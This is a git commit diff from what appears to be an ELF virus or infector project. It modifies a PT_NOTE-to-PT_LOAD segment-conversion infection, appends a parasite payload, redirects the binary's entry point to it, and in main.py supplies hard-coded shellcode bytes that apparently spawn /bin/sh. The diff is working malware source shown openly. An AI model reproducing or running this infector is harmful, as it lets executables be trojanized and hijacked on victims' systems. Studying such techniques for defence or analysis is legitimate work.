2bbd4db0275f70dbf47c9c8e26a3bdb0d840fa72
tomerfry <sabrina@DESKTOP-T52SCE5.localdomain>
2020-04-25 22:13:25 +0300

    Fixed some of the NoteConversion-infection.

--- infections/note_conversion.py
+++ infections/note_conversion.py
@@ -11,19 +11,22 @@ class NoteInfector(Infector):
 		print('[1] Getting data segment phdr.\n')
 		data_phdr = get_data_phdr(elf_obj.phdrs)
 
-		ds_end_addr = data_phdr['p_vaddr'] + data_phdr['p_memsz']
+		#ds_end_addr = data_phdr['p_vaddr'] + data_phdr['p_memsz']
 		align_size = data_phdr['p_align']
 		parasite_size = len(payload)
 
 		note_phdr = get_note_phdr(elf_obj.phdrs)
 		note_phdr['p_type'] = PT_LOAD
 
-		note_phdr['p_vaddr'] = ds_end_addr + align_size
-		note_phdr['p_paddr'] = ds_end_addr + align_size
+		note_phdr['p_vaddr'] = len(elf_obj.file_content) + align_size
+		note_phdr['p_paddr'] = len(elf_obj.file_content) + align_size
+		#note_phdr['p_vaddr'] = ds_end_addr + align_size
+		#note_phdr['p_paddr'] = ds_end_addr + align_size
 		note_phdr['p_filesz'] = parasite_size
 		note_phdr['p_memsz'] = parasite_size
 		note_phdr['p_offset'] = len(elf_obj.file_content)
 		note_phdr['p_align'] = data_phdr['p_align']
 
+		elf_obj.ehdr['e_entry'] = len(elf_obj.file_content) + align_size
 		elf_obj.file_content += payload
 		elf_obj.save_as('new_simple')
--- main.py
+++ main.py
@@ -21,7 +21,7 @@ def main():
 
     f = open(arguments.get(FILE_NAME_ARG), 'rb')
     elf_obj = Elf(f)
-    infector = SilvioPaddingInfector()
+    infector = NoteInfector()
     infector.infect(elf_obj, 'new_simple', b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
 
     f.close()
